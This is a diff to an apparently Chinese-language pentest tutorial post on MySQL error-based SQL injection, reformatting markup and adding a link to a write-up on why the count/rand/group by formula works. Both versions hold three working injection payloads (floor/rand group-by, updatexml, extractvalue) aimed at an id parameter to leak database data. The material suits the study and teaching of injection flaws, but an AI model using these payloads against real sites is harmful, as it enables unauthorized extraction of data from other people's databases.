@@ -15,12 +15,16 @@ topics = ["Pentest"]
 ```
 
 ### 0x01 利用方式
-报错注入只要套用公式即可，公式如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
+报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
 
-?id=2' and (select 1 from <font color="00CDCD">(select <u>count(\*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</font>
-)-\-+  
-?id=2' and updatexml(1,concat(0x7e,(<font color="00CDCD">SELECT @@version</font>),0x7e),1)-\-+  
-?id=1' and extractvalue(1, concat(0x7e, (<font color="00CDCD">select @@version</font>),0x7e))-\-+
+?id=2' and (select 1 from <f>(select <u>count(\*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</f>
+)-\-+
+
+?id=2' and updatexml(1,concat(0x7e,(<f>SELECT @@version</f>),0x7e),1)-\-+
+
+?id=1' and extractvalue(1, concat(0x7e, (<f>select @@version</f>),0x7e))-\-+
+
+第一个公式具体原理可以参考：[MySQL报错注入原理分析(count()、rand()、group by)](http://wyb0.com/posts/mysql-injection-error-based-theory-count-rand-groupby?_blank)
 
 ### 0x02 公式解析
 ```
